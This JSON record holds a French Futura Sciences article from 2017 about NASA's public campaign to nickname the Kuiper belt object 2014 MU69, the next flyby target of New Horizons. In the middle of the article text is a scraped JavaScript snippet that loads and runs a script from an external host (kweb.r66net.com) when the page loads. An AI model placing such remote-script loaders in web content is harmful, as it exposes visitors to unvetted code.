{"title": "Aidez la Nasa à nommer cet étonnant astéroïde", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "13/11/2017", "content": "Aux confins du Système solaire, à plus de 6,5 milliards de kilomètres de la Terre, l'énigmatique 2014 MU69 attend son surnom. La sonde New Horizons qui a survolé Pluton en 2015, fonce tout droit vers lui. La Nasa vous invite à l'aider à lui trouver un nom... La Nasa, et en premier lieu l'équipe de  New Horizons  avec le soutien de l'institut Seti, nous invite à prendre part à la grande aventure de cette mission d'exploration des confins du  Système solaire . Notre contribution, certes modeste, est demandée pour choisir le surnom de (486958)  2014 MU69 . MU69 (pour faire court) est la prochaine destination de la sonde spatiale  New Horizons , laquelle, rappelons-le, nous avait révélé, le 14 juillet 2015, le  vrai visage de Pluton . Fonçant à 50.000 km/h, le vaisseau se dirige désormais vers cet objet de la  ceinture de Kuiper  distant de 1,6 milliard de km de la  planète naine  — et quelque 6,5 milliards de kilomètres de la  Terre . Il est prévu de l'atteindre le premier janvier 2019 pour un  survol  à environ 12.000 km de sa surface. Ce sera le corps céleste le plus lointain jamais visité par une sonde spatiale terrestre.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quel nom pour cet astéroïde qui est peut-être double ? La cible  MU69  — aussi nommée « PT1 » pour  Potential Target 1 , dans un premier temps — avait été sélectionnée après une campagne de recherche conduite avec le  télescope spatial Hubble . Des observations terrestres au cours de l'été dernier, lors d' occultations  d' étoiles , suggèrent que cet objet céleste situé à plus de 43  unités astronomiques  du  Soleil  est soit un  astéroïde  double rapproché, soit une binaire en contact de deux corps de même taille ou presque (20 et 18 km ?). « Après le survol, une fois que nous en saurons plus sur ce monde fascinant, nous allons, avec la Nasa, travailler avec l' Union astronomique internationale  pour attribuer un nom officiel à MU69 » , a déclaré Mark Showalter, membre de l'équipe scientifique de New Horizons et directeur de l'Institut Seti de Mountain View. Jusqu'au premier décembre, vous pouvez donc contribuer à la nomination informelle de l'objet sur le site  Internet   frontierworlds . Au choix, vous pouvez proposer un nom (en respectant plusieurs règles définies sur le site) ou encore voter pour l'un de ceux déjà en lice. Par exemple :  Año Nuevo , en référence bien sûr au jour du survol de la sonde ;  des sites fictifs comme  Camalor , où vivent des  aliens  dans la nouvelle de Robert L. Forward,  Camelot 30K  ; des sites terrestres, comme  Patagonia  où l'occultation fut en partie observée ; ou encore  Ultima Thule  qui se traduit par « au-delà des frontières du monde connu ». New Horizons : revivez l'approche de Pluton comme si vous y étiez                       Dans cette vidéo composée de plus de cent images prises par la sonde New Horizons au cours des six semaines qui ont précédé le survol historique de Pluton, le 14 juillet 2015, nous pouvons revivre cette approche comme si nous étions à bord. Petit à petit, Pluton et Charon dévoilent leurs surfaces, inconnues jusqu’alors. À la fin de la séquence, on découvre ses reliefs dans la plaine Spoutnik, survolée au plus près, à 12.500 km. Un voyage inoubliable pour les scientifiques et le grand public qui est encore loin d’être achevé.                                       ", "theme": "sciences"}